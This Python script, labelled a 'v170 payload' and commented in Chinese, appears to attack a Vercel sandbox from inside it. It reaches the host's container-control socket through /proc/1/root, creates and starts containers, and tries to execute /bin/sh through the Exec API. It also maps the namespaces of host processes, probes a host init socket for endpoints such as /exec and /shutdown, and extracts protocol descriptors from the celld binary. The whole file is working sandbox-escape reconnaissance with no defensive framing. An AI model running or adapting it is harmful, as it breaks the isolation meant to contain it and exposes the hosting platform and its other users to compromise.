# -*- coding: utf-8 -*-
"""v170 payload: ns 网络拓扑 + init.sock 路径枚举 + Process descriptor 完整提取
输出 /vercel/sandbox/v170c.out"""
import socket, struct, time, json, os, signal, re, ctypes, subprocess

OUT = '/vercel/sandbox/v170c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def probe_unix(sockpath, payload=b'', t=2.5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if payload:
            s.sendall(payload)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 2500:
                    break
        except Exception:
            pass
        s.close()
        return d[:2000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__


def bin_ctx(path, anchors, before=100, after=1400, max_hits=8):
    try:
        data = open(path, 'rb').read()
        hits = 0
        for anc in anchors:
            if hits >= max_hits:
                break
            for m in re.finditer(re.escape(anc), data):
                s = max(0, m.start() - before)
                seg = data[s:m.start() + after]
                log('CTX %s @0x%x: %r' % (anc, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('CTX done hits=%d' % hits)
    except Exception as e:
        log('CTX EXC %s' % e)


def find_proc(comm_list):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:120].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                return d, comm, cl
    return None


# ============ 1: Create yes + Start ============
log('=== 1 setup ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
log('Create yes -> %s %r' % (st, pay[:150]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
yes_pid = None
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:150]))
    time.sleep(1)
    f = find_proc(['yes'])
    if f:
        yes_pid = f[0]
        log('yes pid=%s' % yes_pid)

# ============ 2: ns 对比 (网络拓扑) ============
log('=== 2 ns ===')
for pid_tag in [('1', 'celld'), (str(os.getpid()), 'self'),
                (str(yes_pid), 'yes-ctr') if yes_pid else None]:
    if not pid_tag:
        continue
    pid, tag = pid_tag
    try:
        ns = {}
        for n in ['pid', 'mnt', 'net', 'uts', 'ipc', 'user', 'cgroup']:
            try:
                ns[n] = os.readlink('/proc/%s/ns/%s' % (pid, n))
            except Exception:
                ns[n] = '?'
        log('NS %s: %s' % (tag, ns))
    except Exception as e:
        log('NS %s EXC %s' % (tag, e))
# 其他进程的 ns (sandboxctrl/sandbox-init/containerd)
for d in sorted(os.listdir('/proc')):
    if d.isdigit():
        try:
            comm = open('/proc/%s/comm' % d).read().strip()
        except Exception:
            continue
        if comm in ('containerd', 'sandboxctrl', 'sandbox-init', 'runc'):
            try:
                netns = os.readlink('/proc/%s/ns/net' % d)
                pidns = os.readlink('/proc/%s/ns/pid' % d)
                mntns = os.readlink('/proc/%s/ns/mnt' % d)
                log('NS %s(%s): net=%s pid=%s mnt=%s' % (comm, d, netns, pidns, mntns))
            except Exception:
                pass

# ============ 3: eth0 详情 ============
log('=== 3 eth0 ===')
for f_ in ['address', 'mtu', 'operstate', 'ifindex', 'carrier', 'speed']:
    try:
        log('eth0/%s=%s' % (f_, open('/proc/1/root/sys/class/net/eth0/%s' % f_).read().strip()))
    except Exception as e:
        log('eth0/%s EXC %s' % (f_, e))
try:
    log('LO: %s' % os.listdir('/proc/1/root/sys/class/net/lo'))
except Exception as e:
    log('lo EXC %s' % e)

# ============ 4: init.sock 路径枚举 ============
log('=== 4 init.sock paths ===')
sp = '/proc/1/root/volumes/run/vercel/share/init.sock'
paths = ['/', '/health', '/healthz', '/status', '/v1/status', '/api', '/api/v1', '/info',
         '/version', '/ping', '/ready', '/metrics', '/debug', '/shutdown', '/stop',
         '/init', '/sandbox', '/session', '/run', '/exec', '/start', '/config', '/settings']
for p in paths:
    for meth in ['GET', 'POST']:
        body = b'{}' if meth == 'POST' else b''
        r = probe_unix(sp, ('%s %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
                            'Content-Length: %d\r\nConnection: close\r\n\r\n' % (meth, p, len(body))).encode() + body, t=2)
        if isinstance(r, bytes) and b'404' not in r[:30] and b'400' not in r[:30]:
            log('INIT %s %s -> %r' % (meth, p, r[:400]))
        elif isinstance(r, bytes) and b'400' in r[:30]:
            log('INIT %s %s -> 400 %r' % (meth, p, r[:200]))

# ============ 5: Process 完整 descriptor ============
log('=== 5 process proto ===')
bin_ctx(R + '/opt/vercel/celld',
        [b'types/process.proto', b'ProcessRequest'],
        before=50, after=1500, max_hits=6)

# ============ 6: Exec 带 terminal/cwd 变体 ============
log('=== 6 exec variants ===')
if cid:
    for body in [{'container_id': cid, 'process': {'command': '/bin/sh', 'arguments': ['-c', 'sleep 120'],
                                                   'terminal': False, 'cwd': '/'}},
                 {'container_id': cid, 'process': {'command': '/bin/sleep', 'arguments': ['120'],
                                                   'terminal': False}},
                 {'container_id': cid, 'process': {'command': '/bin/sleep', 'arguments': ['120'],
                                                   'terminal': True}}]:
        st6, pay6 = raw_req(CELL, '%s/Exec' % CTRS, json.dumps(body).encode(), t=6)
        log('ExecV %s -> %s %r' % (json.dumps(body)[:90], st6, pay6[:250]))
        time.sleep(0.8)
        # 找新进程
        for d in sorted(os.listdir('/proc')):
            if d.isdigit():
                try:
                    comm = open('/proc/%s/comm' % d).read().strip()
                except Exception:
                    continue
                if comm in ('sleep', 'sh'):
                    try:
                        cl = open('/proc/%s/cmdline' % d).read()[:80].replace('\x00', ' ')
                    except Exception:
                        cl = '?'
                    log('hostproc %s %s %s' % (d, comm, cl))
                    break

log('V170_DONE')
f.close()
